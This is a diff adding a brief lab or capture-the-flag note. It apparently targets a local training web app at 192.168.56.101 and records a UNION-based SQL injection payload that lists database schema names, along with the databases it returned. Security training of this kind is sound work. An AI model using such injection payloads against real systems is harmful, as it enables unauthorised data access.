@@ -1,0 +1,15 @@
+go to http://192.168.56.101/index.php?page=member
+
+# get database names
+100 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--
+
+We get :
+- information_schema
+- Member_Brute_Force
+- Member_Sql_Injection
+- Member_guestbook
+- Member_images
+- Member_survey
+
+
+Done!
